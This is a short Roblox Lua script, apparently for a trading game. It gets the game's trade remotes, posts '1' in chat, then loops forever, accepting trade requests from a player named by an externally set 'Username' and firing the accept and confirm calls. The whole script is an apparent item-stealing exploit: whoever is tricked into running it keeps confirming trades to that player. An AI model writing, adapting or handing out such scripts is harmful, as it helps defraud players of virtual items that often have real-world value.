local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local TradeAcceptOnRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local Service = game:GetService("TextChatService")
Service.TextChannels.RBXGeneral:SendAsync("1")

plr = game.Players[Username]

while task.wait() do
    wait(0.1)
    TradeAcceptOnRequest:InvokeServer(plr, true)
    AcceptNegotiationRemote:FireServer()
    AcceptTradeRemote:FireServer()
end
